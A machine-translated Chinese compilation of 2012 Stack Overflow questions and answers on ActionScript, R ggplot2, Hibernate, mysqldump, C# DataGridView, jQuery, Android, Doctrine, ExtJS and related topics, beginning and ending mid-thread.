            switch(e.keyCode) {
                case 37 :
                    left=true;
                    break;
                case 39 :
                    right=true;
                    break;
            }
        }
        private function onKUp(e:KeyboardEvent):void {
            switch(e.keyCode) {
                case 37 :
                    left=false;
                    break;
                case 39 :
                    right=false;
                    break;
            }
        }
        private function onEFrame(e:Event):void {
            if (left) {
                cannon.rotation-=ROT_SPEED;
            }
            if (right) {
                cannon.rotation+=ROT_SPEED;
            }
        }
        private function placeContainer():void {
            bubCont=new Sprite();
            addChild(bubCont);
            bubCont.graphics.lineStyle(1,0xffffff,1);
            for (var i:uint=0; i<4; i++) {
                if (i%2==0) {
                    for (var j:uint=0; j<15; j++) {
                        bubbleArr[i]=new Array();
                        bubbleArr[i][j]=Math.floor(Math.random()*6);
                        bubble = new bubble_mc(bubbleArr[i][j],i,j);
                        bubCont.addChild(bubble);
                    }
                } else {
                        if (j<14) {
                            bubbleArr[i][j]=Math.floor(Math.random()*6);
                            bubble = new bubble_mc(bubbleArr[i][j],i,j);
                            bubble.x=68+i*36;
                            bubCont.addChild(bubble);
                        }
                }
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-13T12:50:50.580

我已经解决了！如果有人有同样的问题，这是我解决它的代码！（我对 x 坐标所做的更改无关紧要..）

**泡泡MC：**

```
package  {
    import flash.display.MovieClip;
    public class bubble_mc extends MovieClip {
        public function bubble_mc(val:uint,row:uint,col:uint) {
            gotoAndStop(val+1);
            name=row+"_"+col;
            x=59+col*36;
            y=40+row*36;
        }
    }
} 
```

**主要的**

```
package  {
    import flash.display.Sprite;
    import flash.events.KeyboardEvent;
    import flash.events.Event;
    public class Main extends Sprite {
        private const ROT_SPEED:uint=2;
        private const R:uint=18;
        private const D:Number=R*Math.sqrt(3);
        private var bubbleArr:Array=new Array();
        private var cannon:cannon_mc;
        private var bubble:bubble_mc;
        private var left:Boolean=false;
        private var right:Boolean=false;
        private var bubCont:Sprite;
        public function Main() {
            placeContainer();
            placeCannon();
            stage.addEventListener(KeyboardEvent.KEY_DOWN,onKDown);
            stage.addEventListener(KeyboardEvent.KEY_UP,onKUp);
            addEventListener(Event.ENTER_FRAME,onEFrame);
        }
        private function placeCannon():void {
            cannon=new cannon_mc();
            addChild(cannon);
            cannon.y=385.5;
            cannon.x=320;
        }
        private function onKDown(e:KeyboardEvent):void {
            switch(e.keyCode) {
                case 37 :
                    left=true;
                    break;
                case 39 :
                    right=true;
                    break;
            }
        }
        private function onKUp(e:KeyboardEvent):void {
            switch(e.keyCode) {
                case 37 :
                    left=false;
                    break;
                case 39 :
                    right=false;
                    break;
            }
        }
        private function onEFrame(e:Event):void {
            if (left) {
                cannon.rotation-=ROT_SPEED;
            }
            if (right) {
                cannon.rotation+=ROT_SPEED;
            }
        }
        private function placeContainer():void {
            var iRow:Boolean=false;
            bubCont=new Sprite();
            addChild(bubCont);
            bubCont.graphics.lineStyle(1,0xffffff,1);
            for (var i:uint=0; i<4; i++) {
                if (! iRow) {
                    for (var j:uint=0; j<15; j++) {
                        bubbleArr[i]=new Array();
                        bubbleArr[i][j]=Math.floor(Math.random()*6);
                        bubble = new bubble_mc(bubbleArr[i][j],i,j);
                        bubCont.addChild(bubble);
                        iRow=true;
                    }
                } else {
                    for (j=0; j<15; j++) {
                        bubbleArr[i]=new Array();
                        bubbleArr[i][j]=Math.floor(Math.random()*6);
                        bubble = new bubble_mc(bubbleArr[i][j],i,j);
                        bubble.x=77+j*36;
                        bubCont.addChild(bubble);
                        iRow=false;
                    }
                }
            }
        }
    }
} 
```

# r - 在 ggplot 中设置上限以包含大于最大值的标签

> ID：11427212
> 
> 赞同：11
> 
> 时间：2012-07-11T07:00:22.607
> 
> 标签：r, ggplot2

我的数据范围似乎总是大于 y 轴的顶部标签。有没有一种方法可以在不手动设置限制的情况下自动包含它？

例如在

```
ggplot(data.frame(x=1:11, y=c(11:17,5:2)), aes(x,y)) + geom_point() 
```

我想让标签 0 和 20 出现在 y 轴上，o 和 12 出现在 x 轴上（并且绘图相应地展开）。例如，这应该自动完成，而无需在比例选项中指定这些数字。

![在此处输入图像描述](../Images/7ecbd2d3622fec396b0584f5604b91b6.png)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2014-01-23T11:35:22.020

以下解决方案怎么样：

```
library(ggplot2)

d <- data.frame(x=1:11, y=c(11:17,5:2))
px <- pretty(d$x)
py <- pretty(d$y)

ggplot(d, aes(x,y)) + geom_point() +
  scale_x_continuous(breaks=px, limits=range(px)) +
  scale_y_continuous(breaks=py, limits=range(px)) 
```

![在此处输入图像描述](../Images/8b00ace1e9bab451d8dd2f7eeb9dd1f9.png)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-07-11T07:46:28.033

```
dat<-data.frame(x=1:10, y=c(11:17,5:3))
ggplot(dat, aes(x,y)) + 
  geom_point()+
  scale_y_continuous(breaks=c(pretty(dat$y, n=4),18), expand=c(0.25, 0.25)) 
```

![ggplot 漂亮的休息](../Images/0429dac368147aea29ef3c2ca167f8b5.png)

该`pretty`函数选择 1、2 或 5 倍的 10 次方作为很好的中断。然后我只将 18 包含到该向量中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-11T07:11:19.667

也许与`scale_y_continuous`论点`expand`：

```
ggplot(data.frame(x=1:10, y=c(11:17,5:3)), aes(x,y)) +
  geom_point() +
  scale_y_continuous(expand=c(0.5, 0.5)) 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-07-12T06:17:32.223

所以我不认为`expand`实际上是解决这个问题的方法，而是`expand_limits`。这显然不是最漂亮的代码，但这基本上是我正在寻找的功能，其中 y 轴上的标签完全包含数据。

```
dat<-data.frame(x=1:10, y=c(11:17,5:3))
ggplot(dat, aes(x,y)) + 
geom_point() + 
expand_limits(y=c(min(pretty(c(dat$y, min(dat$y) * (0.95)))), max(pretty(c(dat$y, max(dat$y) * (1.05)))))) 
```

![完全缩放周围的数据](../Images/a9ad5409882b455b4391b05e363572f1.png)

我假设 expand default 为 0.05，并且 pretty 与默认值一起使用。有一个更好的方法吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-03-28T22:03:30.527

您是否尝试过跳过 0.95 * 1.05 乘数？

```
expand_limits(y=c(min(pretty(c(dat$y,min(dat$y)))),max(pretty(c(dat$y,max(dat$y)))))) 
```

# hibernate - Struts2休眠应用程序未在离线模式下部署

> ID：11427214
> 
> 赞同：1
> 
> 时间：2012-07-11T07:00:39.117
> 
> 标签：hibernate, struts2

我的应用程序不允许我在离线模式下运行。`Error Filter Start`在离线模式下运行 Tomcat 时会抛出Tomcat。

我在想的是由于 dtd 出现在`struts.xml`, `hibernate.cfg`, `xml,hbm.xml`. 我试图`SYSTEM`通过查看 Eclipse 缓存部分中的缓存条目来将标头位置更改为，但结果是相同的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:33:04.513

这是一个技巧。您仍然可以使用 PUBLIC，并下载 DTD 文件，将其放入您的应用程序并将您的休眠配置文件指向 DTD。

**例子**

原来的：

```
<!DOCTYPE hibernate-configuration PUBLIC
          “-//Hibernate/Hibernate Configuration DTD 3.0//EN”
          “http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd”&gt; 
```

更正：

```
<!DOCTYPE hibernate-configuration PUBLIC
          “-//Hibernate/Hibernate Configuration DTD 3.0//EN”
          “http://localhost/your/app/path/to/the/dtd/hibernate-configuration-3.0.dtd”&gt; 
```

# mysql - mysqldump 命令复制 MySQL 管理员创建的备份

> ID：11427217
> 
> 赞同：2
> 
> 时间：2012-07-11T07:00:44.467
> 
> 标签：mysql, backup, mysqldump, database-backups

我负责管理 MySQL 数据库的数据库备份。这是我过去不必做的事情，我正在努力建立一个每晚压缩的自动备份系统。

目前，夜间备份覆盖了 MySQL 中的所有数据库。正在使用 MySQL Administrator 备份数据库，并在“高级选项”选项卡下使用以下设置：

在“备份执行方法”框中，选中了 InnoDB Online Backup 的单选按钮，以及 Complete backup 的复选框。在“输出文件选项”框中，备份类型为“SQL 文件”并选中以下框：添加 DROP 语句、完成 INSERT、注释和禁用键。

此备份设置为每天运行，生成的 sql 文件大约为 3.5GB。

我想自动化备份数据库的过程，然后立即使用 gzip 压缩 sql 文件并删除 sql 文件（以节省存储空间）。

但是，当我尝试使用 mysqldump 时，创建的文件比 MySQL 管理员备份小近 1.5GB。我的命令使用与上面列出的开关相匹配的开关转储了所有数据库，但正如我上面所说，结果是一个小得多的文件。

**有人可以告诉我正确的 mysqldump 命令以输出与 MySQL 管理员使用上面显示的选项创建的文件相匹配的文件吗？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:04:34.673

尝试

```
mysqldump --all-databases --complete-insert -p > databasebackup.sql 
```

请参阅[mysqldump 文档](http://dev.mysql.com/doc/refman/5.1/en/mysqldump.html)

# namespaces - 类库和命名空间有什么区别？

> ID：11427223
> 
> 赞同：9
> 
> 时间：2012-07-11T07:01:10.440
> 
> 标签：namespaces, class-library

类库和命名空间之间的实际区别是什么？我知道两者都用于将类、命名空间等组合在一起。谁能告诉我应该在哪种情况下使用类库以及何时创建新的命名空间。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-11T07:26:28.167

命名空间为类提供了概念上的分离，类库提供了物理分离（在 Windows 中认为是独立的 dll）。

当您想要包装可以与其他项目共享的功能时，类库非常有用。

想象一下创建一个 Windows 应用程序，您将 UI 和实现类（类库）拆分为 2 个不同的项目。然后你发现你需要有一个相同的东西的网络版本。您可以只导入从 Windows 应用程序创建的类库，然后您就可以使用所有实现，只需专注于 Web UI。

如果您在一个项目中创建了整个 Windows 应用程序，并使用命名空间将它们分开，那么这样做会很棘手而且很麻烦。（曾经尝试过导入 exe 吗？）

值得指出的是，类库本身可能会使用命名空间来为其中的类提供进一步的概念分离

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-11T07:03:44.023

命名空间的目的是避免名称冲突。当您有数百个类时，应使用命名空间。其他指标 - 当您的代码被其他人使用并且您的姓名可能与用户代码中的姓名发生冲突时。

另一个重要的区别是类始终是一种数据类型。您可以使用此类型定义变量。命名空间不是一种类型。您不能使用命名空间定义变量。

# javascript - 滑块中的 bgStrecher 背景显示窗口调整大小时的间隙

> ID：11427227
> 
> 赞同：0
> 
> 时间：2012-07-11T07:01:23.727
> 
> 标签：javascript, jquery, browser, resize, slider

我将就我最近完成的项目寻求帮助。

[http://www.coffeefinance.com.au/](http://www.coffeefinance.com.au/)

我搜索了很多，但没有找到任何东西。在这个站点中，我在主页上使用带有 bg-stretcher 的滑块。问题是当我调整窗口大小时，bg 担架不起作用。并且它显示出一个差距。这是附上的屏幕截图。

![屏幕截图浏览器](../Images/091b415a880ec714b49b0dee961397a1.png)

它在所有浏览器中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:14:09.980

经过非常看，我发现它修复了：

```
margin-left:0; 
```

谢谢大家给点意见

# phpstorm - PhpStorm - 无法启用 zen 编码

> ID：11427229
> 
> 赞同：2
> 
> 时间：2012-07-11T07:01:40.640
> 
> 标签：phpstorm, openjdk, emmet

由于我昨天刚刚安装了 PhpStorm，我正在尝试让 zen 编码功能发挥作用。

我看过这里： http: [//www.jetbrains.com/phpstorm/webhelp/zen-coding-support.html](http://www.jetbrains.com/phpstorm/webhelp/zen-coding-support.html)

所以看起来安装了某种默认的 zen 编码，但我无法让它工作。

[在这里](http://blog.jetbrains.com/webide/2010/03/zen-coding-support-in-webstormphpstorm/)，他们说在 TAB 之后点击 form.form-comment#comment>fieldset 应该可以工作 - 但它没有。

这与我正在运行 OpenJDK 有什么关系吗？

谢谢！

编辑：我应该补充一点，这是 PhpStorm 试用版 - 可以吗？

# c# - 在 DataGridView 中添加行（带有预定义的列）

> ID：11427230
> 
> 赞同：0
> 
> 时间：2012-07-11T07:01:40.953
> 
> 标签：c#, visual-studio-2008, datagridview

如何**在 winform 应用程序的 datagridview 中**添加一行。

场景是：

*   我在 Windows 窗体上有一个**网格。**
*   网格的列是预先定义的。（在这里，我的意思是列索引、名称、标题文本和顺序在运行时不可更改。）
*   我需要在该网格中添加新行。

任何人，在这方面帮助我。我该怎么做这个任务？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:08:16.283

试试这样 -

```
dataGridView1.Rows.Add(<col1 value>,<col2 value>,...) 
```

参数将是您为每列指定的值。

**编辑 ：**

从其他评论中获取您的代码，您可以像这样简单地使用它 -

```
myMainApplication.dgvBooksDetails.Rows.Add(objBook.ID, objBook.Title, objBook.Author, 
            objBook.Genre, objBook.Price, objBook.PublishDate, objBook.Description); 
```

**编辑**

在子窗体中，存储主窗体的实例 -

```
public MainForm _mainForm; 
```

在主要形式：

```
SubForm frm = new SubForm();
frm.MainForm = this;
frm.Show(); 
```

然后填充数据网格，这样做 -

```
_mainForm.dgvBookDetails.Rows.Add(..... 
```

希望能帮助到你！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:54:33.930

如果您使用 DataTable 对象作为 DatagGridView 的数据源，那么我建议您使用绑定源。

```
BindingSource bs = new BindingSource();

bs.DataSource = DataTable;

DataGridView1.DataSource = bs; 
```

现在如前所述将行添加到数据表中。

使用此方法，对数据表所做的任何更改都会自动反映在您的 GridView 中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:07:02.353

只需在数据表中添加行并将源与 datagridview 绑定，如下所示：

```
row = dtTable.NewRow();
///HereEnter the value in row
dtTable.Rows.Add(row);
dataGridView1.DataSource = dtTable; 
```

如果要在不使用数据源的情况下添加行，则必须使用[DataGridViewRowCollection.Add](http://msdn.microsoft.com/en-us/library/fbs04kbx.aspx)方法：

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:13:28.590

在您的数据表中添加新行并按照我在上面的评论中提到的那样绑定它，或者这样做

```
 private void dataGridView1_RowEnter(object sender, DataGridViewCellEventArgs e)
        {
            // Get all rows entered on each press of Enter.
            var collection = this.dataGridView1.Rows;
            string output = "";
            foreach (DataGridViewRow row in collection)
            {
            foreach (DataGridViewCell cell in row.Cells)
            {
                if (cell.Value != null)
                {
                output += cell.Value.ToString() + " ";
                }
            }
            }
            // Display.
            this.Text = output;
        } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T07:20:17.333

不`dataGridView1.Rows.Add(1)`适合你吗？

它应该添加对应于`RowTemplate`的行`DataGridView`

# xserver - 如何在 linux 中打开多个 x 窗口并通过 x 客户端监控每个窗口？

> ID：11427231
> 
> 赞同：2
> 
> 时间：2012-07-11T07:01:41.950
> 
> 标签：xserver

我必须编写一个 shell 脚本来打开大约 10 个窗口，并在每个窗口中启动 firefox。而shell脚本运行后，我们的客户需要通过远程客户端监控屏幕。由于每个窗口相互独立，因此每个客户只能通过他的 x 客户端看到属于他的一个 x 窗口屏幕。我该怎么做才能满足这个要求？谢谢

# javascript - 选择没有值属性的所有单选按钮的最安全方法

> ID：11427239
> 
> 赞同：1
> 
> 时间：2012-07-11T07:02:06.727
> 
> 标签：javascript, jquery, jquery-selectors, attributes

[http://jsfiddle.net/CuURK/](http://jsfiddle.net/CuURK/)

我有许多单选按钮，例如：

```
<input type='radio' name='myradio' id='myradio' /> 
```

我需要选择标记中没有 value 属性的所有单选按钮，然后为它们设置属性。以下测试不起作用：

```
$('#myradio').val() // returns 'on'
$('#myradio').attr('value') // returns 'on' 
```

这似乎适用于 Chrome，但不适用于 IE8：

```
$('#myradio').is('[value]'); //doesn't work in IE8 
```

确定元素是否具有 value 属性的最安全方法是什么？对上述行为有解释吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:38:05.727

最好和最快的方法是坚持使用 CSS 选择器：

```
$('input[type="radio"]:not([value])') 
```

将返回所有**不**存在该属性的`input`元素-[请参阅this fiddle](http://jsfiddle.net/fS9EN/1/)。`radio` **`value`**

 **因为它返回一个集合，你可以做任何你想做的事情，比如添加缺失的属性、添加一个类、隐藏或删除元素，而不需要`.each()`循环，因为 jQuery 的大多数方法都可以在集合上工作——[参见这个小提琴](http://jsfiddle.net/fS9EN/2/)。

因此，在您的情况下添加缺少的属性：

```
$('input[type="radio"]:not([value])').attr('value', 'foobar'); 
```

请记住，选择器是有效的 CSS3 选择器。

* * *

更新：

根据[这一点](http://www.standardista.com/css3/css3-selector-browser-support/#ie8notes)`[attr]`，我们的选择器将永远不会在 IE8 中匹配，因为如果给定的 attr 为空（我们正在尝试匹配），则IE8 无法匹配使用。

所以我们必须遍历`input`s 并检查属性`value`是否等于`''`，因为如果它缺少 jQuery 会返回一个空字符串。

[这是一个小提琴](http://jsfiddle.net/fS9EN/7)，它适用于 IE8（我能够在真正的 IE8 上尝试它）。

```
$('input[type="radio"]').each(function (index, element) {
    var $this = $(this);
    if ($this.get(0).outerHTML.indexOf('value') === -1) {
        $this.addClass('found');
    }
}); 
```

对于每个元素，我们检查其`outerHTML`属性是否包含`value`字符串。如果它**不**包含字符串，我们找到了它。正如您将看到的，它只会在这样的节点上失败：

```
<input type="radio" value /> 
```

因为 IE 将其解析为：

```
<input type="radio" /> 
```

这不是有效的解决方案，但它有效。

顺便说一句，正如我在评论中所说，with`input`需要[具有](http://www.w3.org/TR/html401/interact/forms.html#h-17.4)[属性](http://www.w3.org/TR/html401/interact/forms.html#h-17.4)。如果不是，则文档无效，浏览器可能会尝试*更正*文档树——Firefox 似乎添加了默认值，而 Safari 则没有。`type="radio"`[`value`](http://www.w3.org/TR/html401/interact/forms.html#h-17.4)*`on`*

 *最后，如果搜索到的属性不存在，jQuery 会[`.attr()`](http://api.jquery.com/attr/)返回（[参见源代码](https://github.com/jquery/jquery/blob/master/src/attributes.js#L334)）：所以*通常*你可以检查`undefined`

 *```
typeof $('#foo').attr('attributeName') === 'undefined' 
```

查看元素是否具有该`attributeName`属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:40:35.353

以下将起作用：

```
$('input[type="radio"]:not([value])') 
```

如图所示：http: [//jsfiddle.net/4sLzc/1/](http://jsfiddle.net/4sLzc/1/)

返回“on”的原因`.val()`是没有 value 属性的单选按钮返回“on”是默认行为。这不是 jQuery 的事情：如果你说 纯 JavaScript 也会发生同样的事情`document.getElementById("myradio").value`，或者当你提交表单时，你会发现服务器端的“on”是实际提交的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:11:51.257

这将匹配具有 value 属性的元素

```
$('input[value]'); 
```

这对于那些不

```
$('!input[value]'); 
```****

# android - 同一活动的多个实例？

> ID：11427242
> 
> 赞同：1
> 
> 时间：2012-07-11T07:02:27.333
> 
> 标签：android, instance, android-activity

我的应用程序有一些问题，我有 4 个按钮，一个用于启动其他每个活动。假设活动称为 a,b,c,d。我希望能够在这些活动之间进行更改，而不会在堆栈中获得 100ds 的暂停活动，但仍保存回溯历史。

即 a->b->a->c->d->a 其中所有 a 都是活动的同一个实例

所以实际上我想要的是能够重新启动同一个活动实例，而不是开始一个新实例。

可能的？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T07:06:47.457

是的，有可能。

```
mIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
mIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT); 
```

将此标志添加到您的意图中，这会将您的活动置于堆栈之上，而不是创建新的活动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:10:39.870

如果您的活动“a”是您的家，您可以添加这些标志：

```
 intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
```

然后，当您按回时，应用程序将退出（因为您清除了所有其他活动）=> [doc](http://developer.android.com/reference/android/content/Intent.html#FLAG_ACTIVITY_CLEAR_TOP)

# doctrine-orm - 学说是否支持多个 orderBy？

> ID：11427243
> 
> 赞同：1
> 
> 时间：2012-07-11T07:02:27.587
> 
> 标签：doctrine-orm

我正在使用 Doctrine 2.0，并希望对 2 个属性进行排序：

```
$qb->addOrderBy('o.prop1', 'ASC')->addOrderBy('o.prop2', 'ASC') 
```

仅对 prop2 进行排序。

这不起作用（仅在教义 1 中）

```
$qb->addOrderBy('o.prop1 ASC', 'o.prop2 ASC') 
```

如何使用 Doctrine 2.0 对 DQL 中的 2 个属性进行排序？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-13T13:08:56.730

当然。尝试：

```
$qb->orderBy('o.prop1', 'ASC')->addOrderBy('o.prop2', 'ASC') 
```

这对我有用。

# css - 如何制作定时 CSS3 幻灯片？

> ID：11427249
> 
> 赞同：1
> 
> 时间：2012-07-11T07:02:53.867
> 
> 标签：css, fade, css-transitions

如何制作带有淡入淡出过渡的 CSS3 幻灯片，这将是定时的？例如，它会在开始下一个转换之前在一张图片上停留 5 秒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:09:31.523

查看这些演示：

[http://coding.smashingmagazine.com/2012/04/25/pure-css3-cycling-slideshow/#9](http://coding.smashingmagazine.com/2012/04/25/pure-css3-cycling-slideshow/#9)

[http://tympanus.net/codrops/2012/04/30/fluid-css3-slideshow-with-parallax-effect/](http://tympanus.net/codrops/2012/04/30/fluid-css3-slideshow-with-parallax-effect/)

希望会有用。。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-11T07:11:23.197

快速谷歌后，我找到了一些解决方案：

[演示：](http://www.alessioatzeni.com/CSS3-Cycle-Image-Slider/)

[和解释](http://coding.smashingmagazine.com/2012/04/25/pure-css3-cycling-slideshow/)

希望你能让它工作

# objective-c - windowShouldClose 和 windowWillClose 有什么不同？

> ID：11427253
> 
> 赞同：1
> 
> 时间：2012-07-11T07:02:55.400
> 
> 标签：objective-c, nswindow, nswindowcontroller

从名称上看，一个是 will，一个是 should，当我实现 windowShouldClose 时，它​​工作得很好。当我实现 windowWillClose 它工作正常。

但是，当我实现其中两个时，只有 windowShouldClose 起作用，为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:07:17.920

在 Cocoa 中，具有`...should...`返回 a 的委托方法是一种常见模式`BOOL`。代表问你是否*应该*做点什么。当它得到你的答案时，如果检查你是否认为它应该这样做，然后它会*通知*你它*会*做某事（如果你说是的话）。稍后你会得到第三个回调，它*确实*做了一些事情（当它完成时）。

# javascript - 父子应用模型；将整个应用程序加载到容器中

> ID：11427254
> 
> 赞同：1
> 
> 时间：2012-07-11T07:02:55.980
> 
> 标签：javascript, extjs, extjs4, extjs-mvc

**如何在“父”应用程序中加载“子”应用程序？**

我有这个名为的主应用程序`Frame`和几个子应用程序。框架具有边框布局。左侧有一些按钮（如菜单）用于加载其他项目。在中心有我的子项目的容器。框架项目具有默认的 mvc 结构。

在文件夹中，我放置了一个`Test`应用程序。也是默认结构。

```
/frame/app/controller
          /view
      /test/app/controller
               /store
               /model
               /view
           /css
           /app.html
           /app.js
      /test2/app/controller
               /store
               /model
               /view
           /css
           /app.html
           /app.js
      /css
      /app.html
      /app.js 
```

像这样的东西。

现在我想从框架中的一个按钮加载一个子项目。

所以我的函数看起来像这样：

```
function(){
   Ext.require('Test.view.testMainContainer', function(){
       var toPutInMyContainer = Ext.create('Test.view.testMainContainer');
       console.log(toPutInMyContainer);
   });
} 
```

这段代码有两件事是错误的：

1.  js 在 test/ **app** /view/ testMainContainer.js
2.  该功能永远不会触发...

最好的结构是什么，我应该如何处理？

我接下来要做的是在 testMainContainer 中需要控制器、模型、商店和视图，我想在需要时自动加载它们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T11:18:06.497

有多种策略可以实现这一目标。

关于标题问题，您可能想看看[Mitchell Simoens 的 SubAppDemo](https://github.com/mitchellsimoens/SubAppDemo)，它演示了如何在应用程序中加载子应用程序。

一种类似但不同的方法是根据请求动态加载控制器。这是我要做的代码（应用程序对象的一部分）：

```
loadPage: function(aControllerName)
{
    var iController = this.dynamicallyLoadController( aControllerName ),
        iPage = iController.view,
        iContentPanel = this.getContentPanel(),
        iPageIndex = Ext.Array.indexOf(iContentPanel.items, iPage);

    // If the page was not added to the panel, add it.
    if ( iPageIndex == -1 )
        iContentPanel.add( iPage );

    // Select the current active page
    iContentPanel.getLayout().setActiveItem( iPage );
},

dynamicallyLoadController: function(aControllerName)
{
    // See if the controller was already loaded
    var iController = this.controllers.get(aControllerName);

    // If the controller was never loaded before
    if ( !iController )
    {    
        // Dynamically load the controller
        var iController = this.getController(aControllerName);

        // Manually initialise it
        iController.init();
    }

    return iController;
}, 
```

当控制器被动态加载时，它的所有模型和存储也被动态加载。在我的例子中，我总是显式地创建控制器的第一个视图（这意味着视图也是动态加载的）并将其注入到控制器的`view`属性（控制器代码）中：

```
init: function()
{
    this.callParent();

    // The dynamically created view is stored as a property
    this.view = this.getView(this.views[0]).create();
}, 
```

关于您的代码，我不确定为什么您的函数会首先触发。但是，如果您将`Ext.require`任何功能放在外部，它应该可以工作。

# javascript - 缩小使用 JSP 生成的 jQuery

> ID：11427255
> 
> 赞同：0
> 
> 时间：2012-07-11T07:02:58.600
> 
> 标签：javascript, jquery, jsp, minify

我有由 JSP 生成的网页，其中有时还包含 jQuery 代码。jQuery 中的一些 AJAX 调用需要来自 JSP 的参数。例子：

```
$.ajax({
    url: "<%=ivy.html.startref("API/regions.ivp")%>",
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    success: function(data) {
        $.each(data.regions, function() {
            $("#regions").append(
                $("<option></option>").val(this.imPersonalNumber).html(this.cn + " [" + this.imJobTitleDescription + "]")
            )
        });

        $("#regions").val($("#tempRegions").val())
    }
}) 
```

有什么办法可以缩小这种代码？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T12:13:58.660

我建议您将 JSP 内容替换为您选择的某个字符串，例如使用[YUI Compressor](http://refresh-sf.com/yui/)，压缩后您可以将该字符串替换为原始 JSP 内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:33:11.567

在这种情况下，您喜欢压缩由 JSP 生成的 HTML 页面（包含 jquery 调用）。最好的解决方案是实现 servlet 过滤器压缩传出的 HTTP（类似这样的东西：[http](http://code.google.com/p/htmlcompressor/) ://code.google.com/p/htmlcompressor/ ）

另一个流行的解决方案是使用 Apache HTTPD 使用 gzip 压缩传出 HTML 的反向代理 - 这将为您节省大部分流量，同时保持源代码的可读性。

# jquery - jQuery Ajax 成功后的第二次请求

> ID：11427256
> 
> 赞同：0
> 
> 时间：2012-07-11T07:02:59.450
> 
> 标签：jquery, ajax

把我的头发拉出来试图理解这些东西。

情况：
1\. 用户点击评分按钮（评分功能）
2\. 通过 ajax 调用 Rate.php - 将 #CountContainer 更新为 TotalCount（照片被评分的次数）。
3.我现在要做的是……如果TotalCount = 100，执行ImageStatus函数（另一个ajax驱动的函数）

```
function Rate(PhotoID) {
    $.ajax({
    url: 'rate.php',
    data: 'photoID='+photoID,
        success: function(data) {
            $("#CountContainer").html(data);
        }
    });
}  

function ImageStatus(PhotoID) {
    $.ajax({
    url: 'imgStatus.php',
    data: 'photoID='+photoID,
        success: function(data) {
            $("#StatusContainer").html(data);
        }
    }); 
```

与往常一样，我感谢您的编程向导！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:07:52.703

尝试如下速率功能：

```
function Rate(PhotoID) {
  var count = $.ajax({
    url: 'rate.php',
    data: 'photoID='+photoID,
        success: function(data) {
            $("#CountContainer").html(data);
        }
    });
   count = count.responseText;
   if(count == 100) {
       ImageStatus(PhotoID);
   }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:06:49.673

添加

```
if (data == 100) {
    ImageStatus(PhotoId);
} 
```

在函数的成功处理程序中`Rate`？或者当你尝试这个时出了什么问题？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:07:22.037

只需更改`Rate(PhotoID)`为：

```
function Rate(PhotoID) {
    $.ajax({
    url: 'rate.php',
    data: 'photoID='+photoID,
        success: function(data) {
            $("#CountContainer").html(data);
            if(data == '100') {
                ImageStatus(PhotoID);
            }
        }
    });
} 
```

# cross-browser - 多合一位置/哈希更改历史管理库

> ID：11427258
> 
> 赞同：42
> 
> 时间：2012-07-11T07:03:04.730
> 
> 标签：cross-browser, javascript, browser-history

首先，我知道有些库为`location.pushState`/ `popState`（[History.js](https://github.com/balupton/History.js/)、[Hash.js](https://github.com/blixt/js-hash)、[jQuery hashchange](https://github.com/cowboy/jquery-hashchange)）提供了 polyfill，所以请不要只链接到这些库。

我需要一个更强大的库来在 RIA 中实现以下目标：

1.  用户点击链接
2.  库被通知并通过 Ajax 加载上下文（没有完全重新加载！）
3.  所有`<a>`元素都与单击处理程序一起使用，该处理程序
    *   防止页面重新加载 2\. ( `preventDefault`) 和
    *   为旧版浏览器调用`location.pushState`/设置[location.hash](https://stackoverflow.com/questions/3009380/whats-the-shebang-hashbang-in-facebook-and-new-twitter-urls-for)
4.  加载的内容被插入页面并替换当前内容
5.  继续 1。

此外，应在用户导航返回时恢复先前加载的内容。

例如，在 Internet Explorer <10 和任何其他浏览器中单击[Google+ 。](https://plus.google.com/u/0/107772953721716520230/about)

有什么更接近的吗？我需要对 IE8、FF10、Safari 5 和 Chrome 18 的支持。此外，它应该具有像 MIT 或 Apache 这样的许可许可证。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-07-13T09:24:19.377

我相信 Sammy.js ( [http://sammyjs.org](http://sammyjs.org) ) (MIT-licensed) 最专注于你想做的事情，它的两个主要支柱是：

1.  路线
2.  活动

我可以引用文档，但这很简单：

*   设置与要完成的事情相关的客户端路由，例如：通过 ajax 更新视图

